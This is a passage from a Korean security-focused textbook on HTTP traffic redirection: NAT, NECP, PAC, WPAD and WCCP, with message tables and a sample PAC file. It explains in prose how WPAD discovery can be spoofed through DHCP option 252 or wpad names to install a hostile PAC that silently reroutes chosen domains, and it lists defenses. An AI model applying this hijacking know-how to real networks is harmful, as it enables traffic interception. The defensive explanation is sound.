- **출발지 IP 주소를 클라이언트의 IP 주소로 유지하되**, 하드웨어 관점에서 서버에서 클라이언트로 직접 가는(스위치를 우회하는) 경로가 존재하지 않도록 보장한다. 이것을 **half NAT** 라 한다. 장점은 서버가 클라이언트 IP 주소를 얻는다는 것이고, 단점은 클라이언트와 서버 사이 네트워크 전체에 대한 어느 정도의 통제가 필요하다는 것이다.

```
  출발지 클라이언트: 1.1.1.1:80          출발지 NAT 장비: 3.3.3.3:80
  목적지 Joe의 서버: 2.2.2.2:80    ──>   목적지 프록시:   4.4.4.4:80
  HTTP 데이터                             HTTP 데이터
```

*그림 15-3. TCP/IP 데이터그램의 full NAT (HTTP-DG 그림 20-9 기준)*

**보안 관점에서 짚을 것.** full NAT은 15.5.1절에서 예고한 구조를 만든다. 클라이언트 IP가 소실되면 그 뒤의 모든 계층이 클라이언트를 구별할 근거를 잃는다. 잃는 것의 목록은 길다.

- **로그** — 접근 로그의 클라이언트 필드가 전부 스위치의 주소가 된다. 공격 조사에서 "누가" 를 재구성할 수 없다(→ 16.1, 16.5).
- **요율 제한과 계정 잠금** — IP 단위 제한이 전체를 하나로 묶어 버린다. 한 사용자의 오남용이 전원을 막고, 반대로 공격자는 다른 사용자와 구별되지 않는다(→ 22장).
- **IP 기반 접근 통제** — 관리 인터페이스를 특정 대역에서만 허용하는 규칙이 스위치의 주소 하나로 붕괴한다.

그 공백을 메우려고 도입되는 것이 `X-Forwarded-For`류의 헤더다. 그리고 그 헤더는 **요청 메시지 안의 문자열**이므로 15.2절이 서술한 구조로 되돌아간다. 중간자가 그 헤더를 덧붙이는 구조에서 클라이언트가 이미 그 헤더를 넣어 보내면 목록이 이어 붙고, 어느 항목이 신뢰할 수 있는 항목인지는 그 목록 자체로는 알 수 없다(→ 8.6). **정리하면, 네트워크 계층에서 잃어버린 식별자를 애플리케이션 계층의 문자열로 복구하려는 시도는 위조에 비용이 드는 근거를 위조에 비용이 들지 않는 근거로 바꾸는 일이다.** half NAT이 배선의 제약을 감수하면서까지 클라이언트 IP를 보존하려는 이유, 그리고 WCCP가 GRE 캡슐화를 쓰는 이유(15.8절)가 여기에 있다.

### 15.6.6 NECP

**네트워크 요소 제어 프로토콜(Network Element Control Protocol, NECP)** 은 **네트워크 요소(network element, NE)** — IP 패킷을 전달하는 라우터·스위치 같은 장비 — 가 **서버 요소(server element, SE)** — 웹 서버·프록시 캐시처럼 애플리케이션 계층 요청을 서비스하는 장비 — 와 대화할 수 있게 한다.

**NECP는 로드 밸런싱을 명시적으로 지원하지 않는다.** SE가 NE에게 로드 밸런싱 정보를 보낼 방법만 제공하고, NE가 그 정보를 어떻게 쓸지는 NE가 알아서 결정한다. WCCP와 마찬가지로 NECP는 패킷 전달 방식으로 MAC 포워딩, GRE 캡슐화, NAT을 제공한다.

NECP는 **예외(exception)** 개념을 지원한다. SE는 특정 출발지 IP 주소를 서비스할 수 없다고 판단하고 그 주소들을 NE에게 보낼 수 있다. 그러면 NE는 그 IP 주소들에서 온 요청을 원 서버로 전달한다.

**표 15-8. NECP 메시지 (HTTP-DG 표 20-3 기준)**

| 메시지 | 보내는 쪽 | 의미 |
|---|---|---|
| `NECP_NOOP` | — | 아무 동작도 하지 않는다 |
| `NECP_INIT` | SE | SE가 NE와 통신을 개시한다. NE와 TCP 커넥션을 연 뒤 보낸다. SE는 어느 NE 포트로 접속할지 알아야 한다 |
| `NECP_INIT_ACK` | NE | `NECP_INIT`를 확인한다 |
| `NECP_KEEPALIVE` | NE 또는 SE | 피어가 살아 있는지 묻는다 |
| `NECP_KEEPALIVE_ACK` | NE 또는 SE | keep-alive 메시지에 답한다 |
| `NECP_START` | SE | "나는 여기 있고 네트워크 트래픽을 받을 준비가 됐다". 포트를 지정할 수 있다 |
| `NECP_START_ACK` | NE | `NECP_START`를 확인한다 |
| `NECP_STOP` | SE | "나에게 트래픽을 보내지 말라" |
| `NECP_STOP_ACK` | NE | 중지를 확인한다 |
| `NECP_EXCEPTION_ADD` | SE | NE의 목록에 예외를 하나 이상 추가한다. 예외는 출발지 IP, 목적지 IP, (IP 상위) 프로토콜, 포트를 근거로 할 수 있다 |
| `NECP_EXCEPTION_ADD_ACK` | NE | 확인한다 |
| `NECP_EXCEPTION_DEL` | SE | 목록에서 예외를 하나 이상 삭제하도록 요청한다 |
| `NECP_EXCEPTION_DEL_ACK` | NE | 확인한다 |
| `NECP_EXCEPTION_RESET` | SE | 예외 목록 전체를 삭제하도록 요청한다 |
| `NECP_EXCEPTION_RESET_ACK` | NE | 확인한다 |
| `NECP_EXCEPTION_QUERY` | SE | NE의 예외 목록 전체를 질의한다 |
| `NECP_EXCEPTION_RESP` | NE | 예외 질의에 응답한다 |

**보안 관점에서 짚을 것.** NECP와 WCCP는 **인프라의 제어 평면**이다. 데이터 평면 — 실제 HTTP 요청과 응답 — 의 방향을 결정하는 별도의 통신이다. 표 15-8을 그대로 읽으면 그것이 무엇을 뜻하는지 분명해진다. `NECP_START` 하나로 "나에게 트래픽을 보내라"고 선언할 수 있고, `NECP_EXCEPTION_ADD`로 특정 출발지 주소의 트래픽 처리 방식을 바꿀 수 있으며, `NECP_STOP`으로 정상 SE를 서비스에서 빼낼 수 있다.

**이 평면에 참여할 수 있는 자는 트래픽의 방향 자체를 결정한다.** 데이터 평면의 어떤 방어 — 인증, 입력 검증, TLS 종료 지점 — 도 트래픽이 애초에 다른 곳으로 흐르면 관여할 기회를 얻지 못한다. 이 책이 반복해 온 표현으로 하면, **제어 평면은 데이터 평면보다 위에 있는 신뢰 경계이며, 그 경계가 데이터 평면의 경계보다 약하게 지켜지는 경우가 흔하다.** 이 관찰은 15.8절에서 WCCP의 보안 옵션을 볼 때 구체적인 형태를 갖는다.

## 15.7 프록시 리다이렉션 기법 — PAC, WPAD

앞 절은 일반적 리다이렉션 방법을 다뤘다. 콘텐츠는 (보안상의 이유 등으로) 여러 프록시를 거쳐 접근되어야 할 수도 있고, 네트워크에 클라이언트가 활용해야 할 프록시 캐시가 있을 수도 있다. 캐시된 콘텐츠를 가져오는 편이 원 서버로 직행하는 것보다 훨씬 빠를 것이기 때문이다.

그런데 웹 브라우저 같은 클라이언트는 프록시로 가야 한다는 것을 어떻게 아는가. 방법은 셋이다. **명시적 브라우저 설정, 동적 자동 설정, 투명한 인터셉션.** 앞의 둘이 이 절이고, 셋째는 15.6.4~15.6.5절과 15.8절이 다룬 것이다.

13.4절이 클라이언트 프록시 설정을 중간자의 관점에서 이미 서술했다. 이 절은 같은 메커니즘을 **리다이렉션 기법**으로 — 즉 "요청의 목적지를 무엇이 결정하는가"의 관점에서 — 다시 본다.

### 15.7.1 명시적 브라우저 설정

대부분의 브라우저는 콘텐츠를 위해 프록시 서버에 접속하도록 설정할 수 있다. 사용자가 프록시의 이름이나 IP 주소와 포트 번호를 입력하는 메뉴가 있다. 그러면 브라우저는 모든 요청에 대해 그 프록시에 접속한다. 사용자가 브라우저를 올바로 설정하기를 기대하는 대신, 일부 서비스 제공자는 사용자에게 미리 설정된 브라우저를 내려받게 한다. 그런 브라우저는 접속할 프록시의 주소를 이미 알고 있다.

명시적 브라우저 설정에는 두 가지 주요 단점이 있다.

- **프록시를 쓰도록 설정된 브라우저는 프록시가 응답하지 않아도 원 서버에 접속하지 않는다.** 프록시가 다운되었거나 브라우저가 잘못 설정되었으면 사용자는 연결 문제를 겪는다.
- **네트워크 아키텍처를 바꾸고 그 변경을 모든 최종 사용자에게 전파하기가 어렵다.** 서비스 제공자가 프록시를 추가하거나 일부를 서비스에서 빼려면 브라우저 사용자들이 프록시 설정을 바꿔야 한다.

### 15.7.2 프록시 자동 설정(PAC)

브라우저를 특정 프록시에 접속하도록 명시적으로 설정하는 방식은 사용자의 개입과 재설정에 의존하므로 네트워크 아키텍처 변경을 제약한다. **브라우저가 올바른 프록시 서버에 접속하도록 스스로를 동적으로 설정하는 자동 설정 방법론**이 이 문제를 푼다. 그것이 **프록시 자동 설정(Proxy Auto-configuration, PAC)** 프로토콜이다. PAC는 넷스케이프가 정의했고 Netscape Navigator와 Microsoft Internet Explorer가 지원한다.

기본 아이디어는 브라우저가 **PAC 파일**이라는 특수한 파일을 가져오게 하는 것이다. 이 파일이 각 URL에 대해 어느 프록시에 접속할지를 지정한다. 브라우저는 PAC 파일을 가져올 특정 서버를 알도록 설정되어야 하고, 재시작할 때마다 PAC 파일을 가져온다.

PAC 파일은 JavaScript 파일이며 다음 함수를 정의해야 한다.

```javascript
function FindProxyForURL(url, host)
```

브라우저는 요청하는 모든 URL에 대해 이 함수를 호출한다.

```javascript
return_value = FindProxyForURL(url_of_request, host_in_url);
```

반환값은 브라우저가 이 URL을 어디에 요청해야 하는지를 지정하는 문자열이다. 접속할 프록시 이름의 목록(예: `"PROXY proxy1.domain.com; PROXY proxy2.domain.com"`)일 수도 있고, 프록시를 우회해 원 서버로 직행하라는 뜻의 `"DIRECT"` 일 수도 있다.

```
HTTP/1.0 200 OK
Content-type: application/x-ns-proxy-autoconfig
Content-length: 176

function FindProxyForURL(url, host)
{
  if (dnsDomain(host, ".netscape.com"))
     return "DIRECT";
  else
     return "PROXY proxy1.joes-cache.com:8080; DIRECT";
}
```

*예제 15-5. PAC 서버의 응답과 PAC 파일 (HTTP-DG 그림 20-10 기준). `netscape.com` 도메인 요청은 원 서버로 직행하고, 나머지는 `proxy1.joes-cache.com:8080`을 쓰되 그 프록시에 닿지 않으면 직행한다.*

**PAC 프로토콜은 상당히 강력하다.** JavaScript 프로그램은 호스트명과 관련된 여러 파라미터 — DNS 주소, 서브넷 — 는 물론이고 **요일이나 시각**까지 근거로 삼아 브라우저에게 프록시를 고르게 할 수 있다. PAC는 네트워크 아키텍처가 바뀌어도 브라우저가 자동으로 올바른 프록시에 접속하게 해 준다. 서버에서 PAC 파일이 프록시 위치 변경을 반영하도록 갱신되기만 하면 된다.

**PAC의 주된 결점은 브라우저가 PAC 파일을 어느 서버에서 가져올지 알도록 설정되어야 한다는 것이다.** 완전한 자동 설정 시스템이 아니다. 그 문제를 다루는 것이 WPAD다.

### 15.7.3 웹 프록시 자동 발견 프로토콜(WPAD)

**WPAD는 최종 사용자가 프록시 설정을 수동으로 하지 않고, 투명한 트래픽 인터셉션에도 의존하지 않으면서, 웹 브라우저가 근처 프록시를 찾아 쓸 수 있게 하는 것을 목표로 한다.** 웹 프록시 자동 발견 프로토콜을 정의하는 일반적 문제는 선택 가능한 발견 프로토콜이 여럿이라는 점과 브라우저마다 프록시 사용 설정이 다르다는 점 때문에 복잡하다.

#### PAC 파일 자동 발견

WPAD는 HTTP 클라이언트가 PAC 파일을 찾아내고, 그 PAC 파일로 적절한 프록시 서버의 이름을 알아내게 한다. **WPAD가 프록시 서버의 이름을 직접 결정하지 않는 이유는 그렇게 하면 PAC 파일이 제공하는 추가 기능 — 로드 밸런싱, 서버 배열로의 요청 라우팅, 백업 프록시로의 자동 장애 조치 등 — 을 우회하게 되기 때문이다.**

WPAD 프로토콜이 발견하는 것은 **PAC 파일의 URL**, 다른 말로 **설정 URL(configuration URL, CURL)** 이다. PAC 파일은 적절한 프록시 서버의 주소를 반환하는 JavaScript 프로그램을 실행한다.

WPAD를 구현하는 HTTP 클라이언트의 동작은 다음과 같다.

1. WPAD로 PAC 파일의 CURL을 찾는다.
2. CURL에 해당하는 PAC 파일(설정 파일, CFILE)을 가져온다.
3. PAC 파일을 실행해 프록시 서버를 결정한다.
4. PAC 파일이 반환한 프록시 서버로 HTTP 요청을 보낸다.

#### WPAD 알고리즘

WPAD는 올바른 PAC 파일 CURL을 결정하기 위해 일련의 자원 발견 기법을 쓴다. 모든 조직이 모든 기법을 쓸 수 있는 것이 아니므로 여러 발견 기법이 명세되어 있다. WPAD 클라이언트는 CURL을 얻는 데 성공할 때까지 각 기법을 하나씩 시도한다. 현재 명세가 정의한 순서는 다음과 같다.

1. **DHCP** (Dynamic Host Configuration Protocol)
2. **SLP** (Service Location Protocol)
3. **DNS의 잘 알려진 호스트명**
4. **DNS SRV 레코드**
5. **DNS TXT 레코드에 담긴 서비스 URL**

**이 다섯 가지 중 WPAD 클라이언트에게 필수인 것은 DHCP와 DNS 잘 알려진 호스트명 두 가지뿐이다.**

클라이언트는 위 순서대로 자원 발견 요청을 보내되 자기가 지원하는 기법만 시도한다. 발견 시도가 성공하면 얻은 정보로 PAC CURL을 구성한다. 그 CURL에서 PAC 파일을 성공적으로 가져오면 과정이 끝난다. 그렇지 않으면 중단한 지점에서 이어서 계속한다. 모든 발견 메커니즘을 시도하고도 PAC 파일을 가져오지 못하면 **WPAD 프로토콜은 실패하고 클라이언트는 프록시를 쓰지 않도록 설정된다.**

클라이언트는 DNS SRV, 잘 알려진 호스트명, DNS TXT 레코드 방식을 여러 번 순회한다. 매번 DNS 질의의 QNAME이 점점 덜 구체적이 된다. 이렇게 해서 클라이언트는 가능한 한 가장 구체적인 설정 정보를 찾아내되 덜 구체적인 정보로 물러설 수도 있다. **모든 DNS 조회의 QNAME에는 요청하는 자원 종류를 나타내는 `wpad` 접두가 붙는다.**

호스트명이 `johns-desktop.development.foo.com`인 클라이언트가 수행하는 발견 시도의 순서는 다음과 같다.

```
DHCP
SLP
DNS A   lookup on QNAME=wpad.development.foo.com
DNS SRV lookup on QNAME=wpad.development.foo.com
DNS TXT lookup on QNAME=wpad.development.foo.com
DNS A   lookup on QNAME=wpad.foo.com
DNS SRV lookup on QNAME=wpad.foo.com
DNS TXT lookup on QNAME=wpad.foo.com
```

*예제 15-6. 완전한 WPAD 클라이언트의 발견 시도 순서 (HTTP-DG 20장 기준)*

**DHCP를 통한 CURL 발견.** 이 방식이 동작하려면 CURL이 WPAD 클라이언트가 질의할 수 있는 DHCP 서버에 저장되어 있어야 한다. WPAD 클라이언트는 DHCP 서버에 DHCP 질의를 보내 CURL을 얻는다. **CURL은 DHCP 옵션 코드 252에 담긴다**(DHCP 서버가 그 정보로 설정되어 있는 경우). 모든 WPAD 클라이언트 구현이 DHCP를 지원해야 한다. 클라이언트가 초기화 중에 이미 DHCP 질의를 했다면 DHCP 서버가 이미 그 값을 공급했을 수 있다. 값을 클라이언트 OS API로 얻을 수 없으면 `DHCPINFORM` 메시지를 보내 질의한다. 옵션 코드 252는 STRING 타입이고 임의 크기이며, 적절한 PAC 파일을 가리키는 URL을 담는다. 예: `"http://server.domain/proxyconfig.pac"`.

**DNS A 레코드 조회.** 이 방식이 동작하려면 적절한 프록시 서버의 IP 주소가 WPAD 클라이언트가 질의할 수 있는 DNS 서버에 저장되어 있어야 한다. WPAD 클라이언트는 DNS 서버에 A 레코드 조회를 보내 CURL을 얻는다. 조회에 성공하면 적절한 프록시 서버의 IP 주소가 반환된다. WPAD 클라이언트 구현은 이 메커니즘을 지원해야 한다. 기본적인 A 레코드 조회만 필요하므로 간단하다. **WPAD 명세는 웹 프록시 자동 발견을 위한 "잘 알려진 별칭"으로 `wpad`를 쓴다.**

```
QNAME=wpad.TGTDOM., QCLASS=IN, QTYPE=A
```

**PAC 파일 가져오기.** 후보 CURL이 만들어지면 WPAD 클라이언트는 대개 그 CURL에 `GET` 요청을 보낸다. 요청 시 클라이언트는 자기가 처리할 수 있는 CFILE 형식 정보를 담은 `Accept` 헤더를 보내야 한다.

```
Accept: application/x-ns-proxy-autoconfig
```

**또한 CURL이 리다이렉트를 반환하면 클라이언트는 최종 목적지까지 리다이렉트를 따라가야 한다.**

**언제 WPAD를 실행하는가.** 웹 프록시 자동 발견 과정은 최소한 다음 중 하나의 빈도로 일어나야 한다.

- **웹 클라이언트 시작 시** — WPAD는 첫 인스턴스의 시작에서만 수행되고, 이후 인스턴스는 그 설정을 상속한다.
- **네트워킹 스택으로부터 클라이언트 호스트의 IP 주소가 바뀌었다는 신호가 있을 때.**

이에 더해 클라이언트는 앞서 내려받은 PAC 파일이 HTTP 만료에 따라 만료되면 발견 사이클을 시도해야 한다. **주목할 점은 프로토콜에 PAC 파일에 대한 `If-Modified-Since` 조건부 페치 규정이 없다는 것이다.** 클라이언트가 현재 PAC 파일을 무효화하기로 하면 전체 WPAD 프로토콜을 다시 실행해 현재 올바른 CURL을 발견해야 한다.

**타임아웃.** WPAD는 여러 단계의 발견을 거치므로 클라이언트는 각 단계가 시간 제한을 갖도록 해야 한다. 가능하면 각 단계를 **10초**로 제한하는 것이 합리적이라고 여겨지지만, 구현자는 자기 네트워크 특성에 더 적합한 다른 값을 선택할 수 있다.

**"가까움"의 결정 지점.** 이 프로토콜 구조의 주요 동기 중 하나는 클라이언트가 근처 프록시 서버를 찾도록 하는 것이었다. 많은 환경에는 여러 프록시 서버(워크그룹, 기업 게이트웨이, ISP, 백본)가 있다. WPAD 프레임워크에서 "가까움"을 판단할 수 있는 지점은 여럿이다. 서로 다른 서브넷의 DHCP 서버가 다른 답을 반환할 수 있고, DNS 서버가 도메인 접미사마다 다른 SRV/A/TXT 레코드를 반환하도록 설정될 수 있으며, CURL 요청을 처리하는 웹 서버가 `User-Agent` 헤더·`Accept` 헤더·클라이언트 IP/서브넷/호스트명·근처 프록시의 토폴로지 분포 등을 근거로 결정할 수 있다. PAC 파일 자체가 런타임에 클라이언트에서 후보 집합 중 하나를 고를 만큼 표현력이 있을 수도 있다.

### 15.7.4 WPAD 스푸핑과 신뢰 문제

원서는 실제 사고 하나를 기록하고 있다.

**IE 5의 WPAD 구현은 사용자 개입 없이 프록시 설정을 자동으로 감지하게 했다. WPAD가 쓰는 알고리즘은 완전한 도메인 이름 앞에 호스트명 `wpad`를 붙이고, WPAD 서버가 그 호스트명에 응답하거나 3단계 도메인에 도달할 때까지 서브도메인을 점진적으로 제거한다. 예를 들어 `a.b.microsoft.com` 도메인의 웹 클라이언트는 `wpad.a.b.microsoft.com`, `wpad.b.microsoft.com`, 그다음 `wpad.microsoft.com`을 질의한다. 이것이 보안 구멍을 노출했다. 국제적 사용(과 특정 다른 구성)에서는 3단계 도메인이 신뢰할 수 없을 수 있기 때문이다. 악의적 사용자가 WPAD 서버를 세우고 자기가 고른 프록시 설정 명령을 서비스할 수 있었다. 이후 IE 버전(5.01 이후)이 이 문제를 바로잡았다.**

이 사고는 특정 구현의 버그로 읽을 수도 있지만, 그렇게 읽으면 이 절의 요점을 놓친다. **WPAD의 구조 자체가 네 가지 신뢰 문제를 갖는다.**

**첫째, 발견의 결과는 주소가 아니라 실행 코드다.** WPAD가 찾아내는 것은 프록시의 주소가 아니라 PAC 파일의 URL이고, PAC 파일은 브라우저가 실행하는 JavaScript이며, 그 실행 결과가 **모든 요청의 목적지**다. 15.7.2절에서 본 대로 PAC는 URL·호스트·서브넷·요일·시각을 근거로 목적지를 계산할 수 있다. 즉 발견에 성공한 자는 조건부 라우팅 정책 전체를 브라우저 안에 설치한다. "특정 은행 도메인만 내 프록시로, 나머지는 DIRECT"라는 규칙이 그 안에 들어갈 수 있고, 사용자는 그 규칙이 존재한다는 것조차 모른다.

**둘째, 발견 채널의 신뢰를 프로토콜이 다루지 않는다.** DHCP 응답, DNS 응답, `wpad` 이름 규칙 — 어느 것도 "이 응답이 우리 조직의 것이다"를 증명하지 않는다. DHCP 옵션 252는 로컬 네트워크에서 DHCP에 응답할 수 있는 누구나 채울 수 있고, `wpad.<도메인>`이라는 이름은 그 도메인에 이름을 등록할 수 있는 누구나 차지할 수 있다. **1.8절이 서술한 하위 계층 공격의 성립 조건 — 같은 브로드캐스트 도메인에 있으면 응답할 수 있다 — 이 그대로 적용된다.** 로컬 네트워크의 신뢰 여부가 브라우저 전체 트래픽의 목적지를 결정하는 구조다.

**셋째, 이름 접미사 상승은 신뢰 경계를 넘는다.** `wpad.a.b.example.com`이 실패하면 `wpad.b.example.com`을, 그것도 실패하면 `wpad.example.com`을 시도한다는 규칙은, **조직의 도메인 상위가 곧 조직의 상위 관리 주체라는 가정** 위에 서 있다. 그 가정은 조직 내부 도메인에서는 대체로 성립하지만, 공용 접미사와 국가 코드 도메인이 섞이면 성립하지 않는다. IE 5의 사고가 정확히 이것이었다. 이름 계층은 관리 계층이 아니다. 2.7절이 "이름과 신원은 다르다"고 서술한 것의 한 형태다.

**넷째, 실패가 조용하고 성공이 검증되지 않는다.** 모든 발견 기법이 실패하면 클라이언트는 프록시를 쓰지 않도록 설정되고 사용자는 그 사실을 알지 못한다. 반대로 어느 단계에서든 성공하면 클라이언트는 그것이 **옳은** 성공인지 검증할 수단이 없다. 프로토콜 안에 "이 CURL이 우리 조직이 의도한 것인가"를 판정하는 단계가 없기 때문이다.

13.4절이 PAC에 대해 서술한 세 가지 성질 — PAC 파일은 요청 하나하나의 목적지를 결정하는 실행 코드이고, 그 출처와 무결성이 보장되지 않으면 모든 요청의 경로가 그 출처의 통제 아래 놓이며, PAC를 가져오는 통로 자체가 보호되지 않을 수 있다 — 은 WPAD에서 한 단계 더 나빠진다. **PAC에서는 적어도 "어느 서버에서 가져올 것인가"를 관리자가 정했다. WPAD에서는 그것마저 네트워크가 정한다.**

### 15.7.5 방어

**1. 자동 발견을 끄고 PAC URL을 명시적으로 설정한다.** WPAD의 편의는 관리 비용을 줄이지만, 그 대가로 목적지 결정권을 로컬 네트워크에 넘긴다. 명시적 설정으로 돌아가면 15.7.1절의 두 단점(장애 조치 없음, 변경 전파 어려움)을 다시 지게 되지만, PAC 파일이 로드 밸런싱과 백업 프록시 장애 조치를 담당할 수 있으므로 첫 번째 단점은 상당 부분 상쇄된다.

**2. PAC 파일을 보호된 통로로 가져온다.** PAC 파일은 브라우저가 실행하는 코드다. 그것을 평문 HTTP로 가져오는 것은 실행할 코드를 검증 없이 네트워크에서 받는 것과 같다.

**3. 조직 도메인의 `wpad` 이름을 선점한다.** 내부 DNS에서 `wpad.<조직 도메인>`을 조직이 통제하는 값으로 고정하면 접미사 상승이 조직 밖으로 나가기 전에 멈춘다.

**4. 발견 채널을 감시한다.** DHCP 옵션 252가 예상 밖의 값으로 응답되고 있는지, `wpad` 이름 조회가 조직 밖으로 나가고 있는지는 관측 가능한 신호다.

**5. 목적지 결정을 단일 지점으로 좁힌다.** 브라우저마다 다른 프록시를 계산하는 유연성이 필요 없는 환경이라면, 그 유연성 자체가 공격 표면이다. 이 책이 반복하는 원칙 — **필요 없는 유연성은 제거한다**(→ 31.9) — 이 여기에도 적용된다.

## 15.8 캐시 리다이렉션 기법 — WCCP

지금까지 일반 서버로 트래픽을 유도하는 기법과 프록시·게이트웨이로 트래픽을 벡터링하는 특화 기법을 다뤘다. 이 절은 **캐싱 프록시 서버**를 위한 더 정교한 리다이렉션 기법을 본다. 이 기법들은 신뢰성 있고, 고성능이며, 콘텐츠를 인식하려 — 즉 특정 콘텐츠를 갖고 있을 법한 위치로 요청을 배분하려 — 하기 때문에 앞서 논의한 프로토콜보다 복잡하다.

**14.11절과의 역할 분담을 다시 확인한다.** 14.11절은 트래픽이 이미 캐시에 도착한 뒤 캐시들이 서로에게 묻고 답하는 프로토콜(ICP, CARP, HTCP)을 다뤘다. 이 절은 **트래픽을 애초에 캐시로 보내는 기법**을 다룬다. 전자는 캐시와 캐시 사이의 문제이고, 후자는 클라이언트와 캐시 사이의 문제다. 이 절에서 상세히 볼 것은 WCCP 하나다.

### 15.8.1 WCCP 리다이렉션의 동작

시스코가 개발한 **웹 캐시 조정 프로토콜(Web Cache Coordination Protocol, WCCP)** 은 라우터가 웹 트래픽을 프록시 캐시로 리다이렉트할 수 있게 한다. **WCCP는 라우터와 캐시 사이의 통신을 관장해, 라우터가 캐시를 검증하고(캐시가 살아서 동작 중인지 확인하고), 캐시들 사이에 부하를 분산하고, 특정 종류의 트래픽을 특정 캐시로 보낼 수 있게 한다.** WCCP 버전 2(WCCP2)는 개방 프로토콜이며, 이 절이 다루는 것은 WCCP2다.

HTTP에 대한 WCCP 리다이렉션의 흐름은 다음과 같다(다른 프로토콜도 유사하게 리다이렉트된다).

1. 서로 통신할 수 있는 **WCCP 지원 라우터와 캐시**로 구성된 네트워크에서 시작한다.
2. 라우터 집합과 그 대상 캐시들이 **WCCP 서비스 그룹(service group)** 을 이룬다. 서비스 그룹의 설정이 **어떤 트래픽이 어디로 가는지, 트래픽이 어떻게 보내지는지, 그룹 내 캐시들 사이에 부하가 어떻게 분산되는지**를 지정한다.
3. 서비스 그룹이 HTTP 트래픽을 리다이렉트하도록 설정되어 있으면, 그룹의 라우터들이 HTTP 요청을 그룹의 캐시들로 보낸다.
4. HTTP 요청이 그룹의 라우터에 도착하면, 라우터는 **요청의 IP 주소에 대한 해시 또는 마스크/값 집합 쌍 방식**을 근거로 그룹의 캐시 중 하나를 골라 요청을 서비스하게 한다.
5. 라우터는 캐시의 IP 주소로 패킷을 캡슐화하거나 IP MAC 포워딩으로 요청 패킷을 캐시에게 보낸다.
6. **캐시가 요청을 서비스할 수 없으면 패킷이 라우터로 반환되어 통상 전달된다.**
7. 서비스 그룹의 구성원들은 서로 하트비트 메시지를 교환하며 상대의 가용성을 계속 검증한다.

### 15.8.2 WCCP2 메시지

**표 15-9. WCCP2 메시지 (HTTP-DG 표 20-4 기준)**

| 메시지 이름 | 보내는 쪽 | 담고 있는 정보 |
|---|---|---|
| `WCCP2_HERE_I_AM` | 캐시 → 라우터 | 캐시가 트래픽을 받을 수 있음을 라우터에게 알린다. 캐시의 서비스 그룹 정보 전체를 담는다. 캐시가 서비스 그룹에 합류하는 즉시 그룹의 모든 라우터에게 보낸다. `WCCP2_I_SEE_YOU`를 보내는 라우터와 협상한다 |
| `WCCP2_I_SEE_YOU` | 라우터 → 캐시 | `WCCP2_HERE_I_AM`에 응답한다. **패킷 전달 방식, 배정 방식(누가 지정 캐시인가), 패킷 반환 방식, 그리고 보안을 협상하는 데 쓰인다** |
| `WCCP2_REDIRECT_ASSIGN` | 지정 캐시 → 라우터 | 로드 밸런싱을 위한 배정을 한다. 해시 테이블 로드 밸런싱을 위한 버킷 정보나 마스크/값 로드 밸런싱을 위한 마스크/값 집합 쌍 정보를 보낸다 |
| `WCCP2_REMOVAL_QUERY` | 라우터 → 캐시 | 라우터가 `2.5 × HERE_I_AM_T` 초 동안 `WCCP2_HERE_I_AM`을 받지 못하면, 그 캐시를 서비스 그룹에서 제거해야 하는지 확인하기 위해 보낸다. 캐시의 올바른 응답은 `HERE_I_AM_T/10` 초 간격의 동일한 `WCCP2_HERE_I_AM` 세 개다 |

각 WCCP2 메시지는 헤더와 컴포넌트로 이루어진다. WCCP 헤더는 메시지 타입, WCCP 버전, 메시지 길이(헤더 길이 제외)를 담는다. 컴포넌트는 각각 컴포넌트 타입과 길이를 서술하는 4옥텟 헤더로 시작한다.

**표 15-10. 주요 WCCP2 메시지 컴포넌트 (HTTP-DG 표 20-5 기준)**

| 컴포넌트 | 설명 |
|---|---|
| **Security Info** | **보안 옵션과 보안 구현을 담는다. 보안 옵션은 `WCCP2_NO_SECURITY`(0) 또는 `WCCP2_MD5_SECURITY`(1)이다. 옵션이 보안 없음이면 보안 구현 필드는 존재하지 않는다. MD5이면 보안 구현 필드는 메시지 체크섬과 서비스 그룹 비밀번호를 담는 16옥텟 필드다. 비밀번호는 8옥텟을 넘을 수 없다** |
| Service Info | 서비스 그룹을 서술한다. 서비스 타입 ID는 `WCCP2_SERVICE_STANDARD`(0)와 `WCCP2_SERVICE_DYNAMIC`(1) 두 값을 가질 수 있다. 표준이면 서비스 ID만으로 완전히 정의되는 잘 알려진 서비스이며, HTTP가 그 예다. 동적이면 우선순위, 프로토콜, 서비스 플래그(해싱을 결정), 포트가 서비스를 정의한다 |
| Router Identity Info | 라우터 IP 주소와 ID를 담고, 라우터가 통신하려는 모든 웹 캐시를 IP 주소로 나열한다 |
| Web Cache Identity Info | 웹 캐시 IP 주소와 리다이렉션 해시 테이블 매핑을 담는다 |
| Router View Info | 서비스 그룹에 대한 라우터의 관점(라우터와 캐시의 신원)을 담는다 |
| Web Cache View Info | 서비스 그룹에 대한 웹 캐시의 관점을 담는다 |
| Assignment Info | 특정 해싱 버킷에 대한 웹 캐시의 배정을 보인다 |
| Router Query Info | 라우터의 IP 주소, 질의 대상 웹 캐시의 주소, 그 웹 캐시로부터 Here I Am 메시지를 받은 서비스 그룹 내 마지막 라우터의 ID를 담는다 |
| Capabilities Info | 라우터가 지원하는 패킷 전달·로드 밸런싱·패킷 반환 방식을 광고하는 데 쓰이고, 웹 캐시가 선호하는 방식을 라우터에게 알리는 데 쓰인다 |
| Command Extension | 웹 캐시가 종료 중임을 라우터에게 알리는 데 쓰이고, 라우터가 캐시 종료를 확인하는 데 쓰인다 |

### 15.8.3 GRE 패킷 캡슐화와 로드 밸런싱

WCCP를 지원하는 라우터는 HTTP 패킷을 특정 서버로 리다이렉트할 때 **그 서버의 IP 주소로 패킷을 캡슐화한다.** 패킷 캡슐화에는 **일반 라우터 캡슐화(Generic Router Encapsulation, GRE)** 를 나타내는 IP 헤더 proto 필드가 포함된다. 이 proto 필드의 존재가 수신 프록시에게 캡슐화된 패킷임을 알린다.

```
  출발지 클라이언트: 1.1.1.1:80              목적지 프록시: 3.3.3.3:8080   proto: GRE
  목적지 Joe의 서버: 2.2.2.2:80      ──>     └ 출발지 클라이언트: 1.1.1.1:80
  HTTP 데이터                                  목적지 Joe의 서버: 2.2.2.2:80
                                               HTTP 데이터
```

*그림 15-4. WCCP 라우터가 HTTP 패킷의 목적지 IP 주소를 바꾸는 방식 (HTTP-DG 그림 20-12 기준)*

**패킷이 캡슐화되므로 클라이언트 IP 주소가 소실되지 않는다.** 15.6.5절의 full NAT과 정확히 대조되는 지점이다. 원래 패킷 전체가 새 패킷 안에 그대로 담기므로 캐시는 원래 출발지와 원래 목적지를 모두 볼 수 있다.

